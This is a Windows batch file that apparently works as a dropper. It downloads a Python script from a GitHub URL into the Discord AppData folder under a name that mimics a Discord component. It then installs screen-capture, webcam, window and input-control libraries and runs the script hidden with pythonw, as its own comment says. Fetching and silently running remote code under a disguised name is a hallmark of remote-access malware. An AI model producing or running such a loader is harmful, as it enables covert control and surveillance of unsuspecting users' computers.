@echo off
REM Check if the Python script exists, and if so, delete it
if exist "C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py" (
    del /F "C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py"
)

REM Download the Python script to the Discord folder
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/iiMAtEAs/bot/refs/heads/main/discord_api_packages.py -OutFile 'C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py'"

REM Install required Python packages
pip install discord.py
pip install cryptography
pip install requests
pip install opencv-python
pip install numpy
pip install pillow
pip install pygetwindow
pip install pyautogui

REM Run the Python bot script using pythonw to keep it hidden
start /B pythonw.exe "C:\Users\%USERNAME%\AppData\Local\Discord\discord_api_packages.py"

exit
